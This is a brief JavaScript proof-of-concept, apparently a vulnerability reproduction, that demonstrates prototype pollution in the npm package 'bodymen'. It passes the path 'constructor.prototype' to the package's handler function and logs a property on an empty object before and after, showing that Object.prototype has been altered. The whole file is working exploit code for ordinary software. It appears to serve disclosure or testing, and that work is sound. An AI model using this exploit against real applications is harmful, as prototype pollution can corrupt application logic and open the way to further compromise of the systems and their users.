var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const x = require('bodymen');
console.log({}.polluted);
x.handler('constructor.prototype', 'polluted', 'yes');
console.log({}.polluted);